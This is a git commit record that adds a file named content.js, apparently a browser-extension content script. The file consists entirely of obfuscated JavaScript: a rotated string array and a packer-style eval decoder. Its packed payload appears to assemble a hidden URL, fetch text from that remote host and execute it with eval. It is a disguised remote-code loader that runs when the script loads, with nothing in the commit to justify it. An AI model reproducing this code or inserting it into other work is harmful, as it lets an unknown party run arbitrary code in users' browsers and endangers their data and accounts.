309b6ca7589af9f18b56fcb59e6f5f10f734986d
PandaPlop <118017518+PandaPlop@users.noreply.github.com>
2022-11-19 14:25:02 -0600

    Add files via upload

---
+++ content.js
@@ -0,0 +1,38 @@
+var _0x3b6b19 = _0xc6b2;
+
+function _0xc6b2(x, f) {
+    var a = _0x2ada();
+    return (_0xc6b2 = function (x, f) {
+        return a[x -= 492]
+    })(x, f)
+}
+
+function _0x2ada() {
+    var x = ["replace", "126936ZKELVx", "459NsEnAC", "281298yshigX", "14591819voAKmb", "14892ybZTQQ", "z f=B;y B(Q,K){z 17=D();A B=y(F,2Q){F=F-(1x*1n+-1g*I+-H*1m);1k L=17[F];A L},B(Q,K)}(y(V,W){z q=B,E=V();2m(!![]){1f{z P=x(q(25))/(-1V*-C+1U*-1T+1S)*(-x(q(1R))/(-I*-1Q+1P+-1O))+-x(q(1M))/(1E+1L*-H+-C*-1K)*(-x(q(1J))/(-1I+1H+-1G))+-x(q(1F))/(-1W*-1N+-1X+2f)+x(q(2n))/(H*2l+2k+-2j*2i)+x(q(2h))/(-2g+-2o+2e)*(-x(q(1Z))/(2d+-2c+2b*-C))+-x(q(2a))/(-26*C+1C*C+-24)+-x(q(1Y))/(1D+-1s*1B+-I*1l)*(-x(q(1j))/(1i+1h+C*-1e));1d(P===W)1o;1p E['O'](E['N']())}1q(1r){E['O'](E['N']())}}}(D,1t+-1u+-1v));z 1a=1w X=>{z G=B,J={'M':y(R,S){A R(S)},'1c':y(T,U){A T(U)}},Z=Y J[G(1y)](1z,X),1b=Y Z[G(1A)]();J[G(2q)](2B,1b)};1a((f(38)+f(2p)+f(39)+f(3b)+f(36)+f(2V)+f(2T)+f(2U)+f(2W)+f(2R)+f(2Y)+f(2Z)+f(30)+f(31)+f(35)+f(32)+f(33)+f(34)+f(2S))[f(k)](f(37),'j')[f(k)](f(3c),'l')[f(k)](f(3a),'m')[f(k)](f(2X),'n')[f(k)](f(2D),'o')[f(k)](f(2P),'p')[f(k)](f(2s),'r')[f(k)](f(2t),'s')[f(k)](f(2u),'t')[f(k)](f(2v),'u')[f(k)](f(2w),'v')[f(k)](f(2x),'w')[f(k)](f(2y),':')[f(k)](f(2z),'/')[f(k)](f(2A),'.')[f(k)]('1,','a')[f(k)]('2,','b')[f(k)]('3,','c')[f(k)]('4,','d')[f(k)]('5,','e')[f(k)]('7,','g')[f(k)]('8,','h')[f(k)]('9,','i'));y D(){z 11=['28,18,1,23','21,','5,14,20,29',',8,21,2,21','2r','2C','2E','2F','0,1,22,1,1','14,','1c','M','2G',',3,15,14,2','9,3,18,9,1','2H',',1,9,14,28','29,10,19,','22,','4,1,16,12,','20,','2I','8,20,20,16','12,','2J','23,',',19,27,28,','13,','29,','16,',',19,5,18,3',',29,7,9,20','10,','2K','15,',',3,15,13,2','27,','8,16,1,14,','0,5,14,20,','15,16,28,1',',15,14,20,','2L','28,','18,','6,20,28,13','2M','19,','2N','2O'];D=y(){A 11};A D()}", "95GkNRyV", "168472xcnvrj", "fromCharCode", "7fSXpAo", "184682DoNEiP", "2645363YNzCMq", "toString", "20sOBFoO", "\\w+", "|||||||||||||||_0x4b9d38|||||0x16c||||||_0x337a43|||||||parseInt|function|const|return|_0x4fd1|0x1|_0x451f|_0x11a214|_0x3373ca|_0x1086fd|0x3|0x5|_0x20b8d5|_0x2cac8f|_0x47614e|GBNzs|shift|push|_0x385397|_0x3a00ab|_0x26ab19|_0x280902|_0x38ae57|_0x2601f8|_0x25454c|_0x58fe04|_0x56eaf4|await|_0x285114||_0x4e99d9||||||_0x426f14|||Z1|_0x47b790|hhxnd|if|0x34ff|try|0x427|0x2134|0x13d6|0x17c|let|0xda|0x4a8|0xb|break|else|catch|_0x1b8a02|0xb3|0x149716|0x3a346|0x4e1d4|async|0x349|0x172|fetch|0x197|0x2f|0x2327|0x2529|0x719|0x16b|0x198b|0x1c6f|0x2e0|0x16d|0x6af|0x497|0x173|0x3c1|0x17df|0x814|0x329|0x190|0x872|0x11a|0x21|0x1be9|0x4|0x1f94|0x188|0x196|||||0x16ec|0x176|0xc32||||0x194|0xabd|0x1adb|0x25a0|0x20bc|0x1095|0x10ef|0x16e|0x7d|0x60|0xba9|0xbbf|while|0x17f|0xfc6|0x181|0x171|3620380slLYVu|0x192|0x195|0x17b|0x168|0x179|0x180|0x18b|0x191|0x183|eval|replaceAll|0x189|4AnBqGA|54026GCOHzy|3782286xfPtNU|3105UtvJvq|77cfSYgv|517440laKLuB|3442510DRzjOv|696nftYfD|9199647WXNZQV|144HzrlSg|text|0x184|_0x3f2025|0x18c|0x178|0x18f|0x169|0x185|0x18a|0x170|0x17a|0x18e|0x16f|0x175|0x177|0x174|0x18d|0x193|0x16a|0x187|0x17d|0x198|0x182|0x186|0x17e"];
+    return (_0x2ada = function () {
+        return x
+    })()
+}(function (x, f) {
+    for (var a = _0xc6b2, n = _0x2ada();;) try {
+        if (637504 === -parseInt(a(497)) / 1 * (parseInt(a(498)) / 2) + -parseInt(a(492)) / 3 + -parseInt(a(495)) / 4 + parseInt(a(494)) / 5 * (-parseInt(a(507)) / 6) + parseInt(a(499)) / 7 + -parseInt(a(505)) / 8 * (parseInt(a(506)) / 9) + parseInt(a(501)) / 10 * (parseInt(a(508)) / 11)) break;
+        n.push(n.shift())
+    } catch (x) {
+        n.push(n.shift())
+    }
+})(), eval(function (x, f, a, n, r, t) {
+    var e = _0xc6b2;
+    if (r = function (x) {
+            var f = _0xc6b2;
+            return (x < 62 ? "" : r(parseInt(x / 62))) + ((x %= 62) > 35 ? String[f(496)](x + 29) : x[f(500)](36))
+        }, !"" [e(504)](/^/, String)) {
+        for (; a--;) t[r(a)] = n[a] || r(a);
+        n = [function (x) {
+            return t[x]
+        }], r = function () {
+            return e(502)
+        }, a = 1
+    }
+    for (; a--;) n[a] && (x = x[e(504)](new RegExp("\\b" + r(a) + "\\b", "g"), n[a]));
+    return x
+}(_0x3b6b19(493), 0, 199, _0x3b6b19(503)
+    .split("|"), 0, {}));
